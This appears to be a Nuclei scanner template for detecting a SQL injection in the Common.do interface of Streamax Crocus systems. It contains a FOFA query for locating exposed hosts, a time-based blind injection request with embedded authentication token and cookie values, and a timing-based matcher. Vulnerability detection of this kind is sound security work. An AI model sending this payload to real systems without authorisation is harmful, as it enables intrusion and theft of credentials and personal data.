id: Crocus-Common-SQL

info:
  name: 锐明Crocus Common SQL注入
  author: HuanXiong
  severity: high
  description: |-
    fofa: body="window.registerLogin.changeAuthCode" || body="inp_verification"
    锐明技术Crocus系统 Common.do 接口存在SQL注入漏洞，经过身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
  reference:
    - 
  tags: SQL Injection

http:
  - raw:
      - |
        GET /Common.do?Action=QueryVehicle&guid=1718800646308&value=&field=(select*from(select%0Asleep(4))a) HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 6.2) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/41.0.887.0 Safari/532.1
        Token: c3RyZWFtYXgyMDAyMDgxODoxNzI0Mzc3MTk2MjExLjcwMTQ=
        Cookie: Saffron.U=VUlEPTEmVU49c3RyZWFtYXgyMDAyMDgxOCZHSUQ9MTcyNDM3NzE5NjIxMS43MDE0NTImUklEPTEmTT1CTWFwJklOUz0x
        Connection: close

    matchers:
      - type: dsl
        name: SQL注入
        dsl:
          - "status_code==200 && duration_1>=8 && duration_1<=9"